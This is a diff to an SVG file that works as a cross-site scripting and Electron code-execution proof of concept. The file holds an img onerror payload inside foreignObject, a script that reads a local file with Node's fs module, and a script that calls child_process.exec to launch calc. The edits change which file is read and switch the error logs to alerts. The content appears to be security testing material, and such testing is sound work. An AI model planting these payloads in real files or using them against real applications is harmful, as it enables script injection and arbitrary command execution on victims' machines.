@@ -9,7 +9,7 @@
   <!-- XSS trigger -->
   <foreignObject width="100" height="50">
     <body xmlns="http://www.w3.org/1999/xhtml">
-      <img src="x" onerror="alert('XSS in SVG')" />
+      <img src="x" onerror="alert(document.domain)" />
     </body>
   </foreignObject>
 
@@ -17,11 +17,11 @@
   <script>
     try {
       const fs = require('fs');
-      fs.readFile('C:/windows/system32/cmd.exe', 'utf8', (err, data) => {
+      fs.readFile('D:/xss.txt', 'utf8', (err, data) => {
         if (!err) alert(data);
       });
     } catch (e) {
-      console.log("Not running in Electron: " + e);
+      alert("Not running in Electron: " + e);
     }
   </script>
 
@@ -30,7 +30,7 @@
     try {
       require('child_process').exec('calc');
     } catch (e) {
-      console.log("Not running in Electron: " + e);
+      alert("Not running in Electron: " + e);
     }
   </script>
 
